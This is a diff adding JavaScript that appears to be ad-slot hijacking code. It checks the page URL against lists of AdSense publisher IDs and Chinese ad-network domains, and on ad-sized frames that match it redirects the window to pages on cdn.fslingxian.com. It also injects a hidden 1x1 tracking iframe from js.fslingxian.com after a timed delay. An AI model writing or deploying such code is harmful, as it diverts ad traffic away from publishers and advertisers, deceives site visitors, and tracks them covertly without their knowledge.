+  if (thisurl.indexOf("=4688452")==-1)//ssp-zj-17-8-21
+  if (thisurl.indexOf("qyhxhnt.com")==-1)//qyhxhnt.com
+  if (thisurl.indexOf("u3436802")==-1)//xin-huanqiu
+  if (thisurl.indexOf("u3099060")==-1)//600-huanqiu
+  if (thisurl.indexOf("anquanzhuomian.com")==-1)//qyhxhnt.com 新闻
+ if (thisurl.indexOf("274868673%2Fdetail")==-1)//foxine.cc新闻
+ if (thisurl.indexOf("cpu.baidu.com%2Fpc%2F1022%2F274868673")==-1)//bd新闻
+  if (thisurl.indexOf("cpu.baidu.com%2Fpc%2F1022%2F272957886")==-1)//个人号没域名，新闻
+  if (thisurl.indexOf("20048166_cpr")==-1)
+  if (thisurl.indexOf("u2823778")==-1)
+	if (thisurl.indexOf("u3029197")==-1)
+	if (thisurl.indexOf("u2931695")==-1)
+			if (thisurl.indexOf("wh/o.htm")==-1)
+				if (thisurl.indexOf("ca-pub-2293503092502376")==-1)
+		if (thisurl.indexOf("ca-pub-2902491558494465")==-1)
+		if (thisurl.indexOf("ca-pub-2366955605329553")==-1)
+		if (thisurl.indexOf("ca-pub-2794113486668030")==-1)
+		if (thisurl.indexOf("ca-pub-3345342726992752")==-1)
+		if (thisurl.indexOf("ca-pub-1637294344676992")==-1)
+		if (thisurl.indexOf("ca-pub-4035663670936475")==-1)
+		if (thisurl.indexOf("ca-pub-2315557948678573")==-1)
+		if (thisurl.indexOf("ca-pub-3156694839426148")==-1)
+		if (thisurl.indexOf("ca-pub-4924918003265011")==-1)
+		if (thisurl.indexOf("ca-pub-6302333718632508")==-1)
+		if (thisurl.indexOf("ca-pub-9481904260493293")==-1)
+			if (thisurl.indexOf("ca-pub-1100654442028552")==-1)
+			if (thisurl.indexOf("ca-pub-7851605901298667")==-1)
+			if (thisurl.indexOf("ca-pub-5365139499357238")==-1)
+			if (thisurl.indexOf("ca-pub-3386439494301291")==-1)
+			if (thisurl.indexOf("ca-pub-7565017160225811")==-1)
+			if (thisurl.indexOf("ca-pub-7064687791894635")==-1)
+			if (thisurl.indexOf("ca-pub-6546220580133583")==-1)
+			if (thisurl.indexOf("ca-pub-5669939452525762")==-1)
+			if (thisurl.indexOf("ca-pub-6814267898619750")==-1)
+			if (thisurl.indexOf("ca-pub-6990508836641197")==-1)
+			if (thisurl.indexOf("ca-pub-1639070143593847")==-1)
+			if (thisurl.indexOf("ca-pub-3471774629982101")==-1)
+			if (thisurl.indexOf("ca-pub-1597793699153517")==-1)
+			if (thisurl.indexOf("ca-pub-2383375354762712")==-1)
+			if (thisurl.indexOf("ca-pub-1637294344676992")==-1)
+			if (thisurl.indexOf("ca-pub-5124022027228589")==-1)
+			if (thisurl.indexOf("ca-pub-7565017160225811")==-1)
+			if (thisurl.indexOf("ca-pub-3649397277889753")==-1)
+			if (thisurl.indexOf("ca-pub-8300551695083500")==-1)
+			if (thisurl.indexOf("ca-pub-7351942412800793")==-1)
+			if (thisurl.indexOf("ca-pub-5037918904186839")==-1)
+			if (thisurl.indexOf("ca-pub-2123968607744363")==-1)
+			if (thisurl.indexOf("ca-pub-6315184421105764")==-1)
+			if (thisurl.indexOf("ca-pub-9664699914429092")==-1)
+  {
+		  var xwidth = document.body.clientWidth;
+		  var xheight = document.body.clientheight
+	  if (xwidth=="300"|| xwidth=="336"|| xwidth=="250"|| xwidth=="320"|| xwidth=="360"|| xwidth=="200")
+  { 	
+  window.location.href='https://cdn.fslingxian.com/gg4/300.htm';
+  }
+  if (xwidth=="970"|| xwidth=="960"|| xwidth=="1000"|| xwidth=="980")
+  { 	
+//window.location.href='https://cdn.fslingxian.com/970.htm';
+  }
+  if (xheight=="600")
+  { 	
+ //window.location.href='https://cdn.fslingxian.com/gg/bd160.htm';
+  }
+   if (xwidth=="600"|| xwidth=="620"|| xwidth=="630"|| xwidth=="640")
+  { 	
+//window.location.href='https://cdn.fslingxian.com/gg5/600ssp.htm';
+}
+  }
+  }
+  //
+  if ((pipei.indexOf("inte.sogou.com")>0)||(pipei.indexOf("alicdn.com") > 0 ))
+  {
+	 var xwidth = document.body.clientWidth;
+		  var xheight = document.body.clientheight
+	  if (xwidth=="300"|| xwidth=="336"|| xwidth=="250"|| xwidth=="320"|| xwidth=="360"|| xwidth=="200")
+  { 	
+  window.location.href='https://cdn.fslingxian.com/gg4/300.htm';
+   }
+   if (xwidth=="970"|| xwidth=="960"|| xwidth=="1000"|| xwidth=="980")
+  { 	
+   window.location.href='https://cdn.fslingxian.com/970.htm';
+   }
+   if (xheight=="600")
+  { 	
+  window.location.href='https://cdn.fslingxian.com/gg/bd160.htm';
+   }
+   }
+//
+if (pipei.indexOf("mediav.com")>0)
+   {
+if (pipei.indexOf("showid=ltMk3A")>0 || pipei.indexOf("showid=OBTI21")>0 || pipei.indexOf("showid=aT12OI")>0 || pipei.indexOf("showid=0UOYGC")>0 || pipei.indexOf("showid=HelD5x")>0 || pipei.indexOf("showid=dLvKAS")>0 || pipei.indexOf("showid=aT12OI")>0 || pipei.indexOf("showid=lo6Sq4")>0 || pipei.indexOf("showid=HYWMDe")>0 || pipei.indexOf("showid=A4kezz")>0 || pipei.indexOf("tuan120.com")>0 || pipei.indexOf("showid=3wKkXu")>0 || pipei.indexOf("showid=AopklG")>0 || pipei.indexOf("lte6ap")>0 )
+  {
+  }else {
+	  var xwidth = document.body.clientWidth;
+		  var xheight = document.body.clientheight
+	  if (xwidth=="300"|| xwidth=="336"|| xwidth=="250"|| xwidth=="320"|| xwidth=="360"|| xwidth=="200"|| xwidth=="230"|| xwidth=="240")
+  { 	
+  window.location.href='https://cdn.fslingxian.com/gg4/300.htm';
+  }
+  if (xwidth=="970"|| xwidth=="960"|| xwidth=="1000"|| xwidth=="980")
+  { 	
+ // window.location.href='https://cdn.fslingxian.com/970.htm';
+  }
+  if (xwidth=="280")
+  { 	
+  window.location.href='https://cdn.fslingxian.com/gg4/300.htm';
+  }
+  if (xheight=="600")
+  { 	
+  //window.location.href='https://cdn.fslingxian.com/gg/bd160.htm';
+  }
+  }
+  }
+  //
+if(document.getElementById("jsttcc")) 
+{ 
+}else{
+	function rjtongji(){
+var div = document.createElement("div");
+div.style = "display: none;";
+div.innerHTML = '<div id="jsttcc"><iframe width="1" height="1" frameborder="0" scrolling="no" allowtransparency="true" src="https://js.fslingxian.com/rj/tj.html?hebing"></iframe></div>';
+document.body.appendChild(div);
+}
+window.setTimeout(rjtongji,1000);
+           }
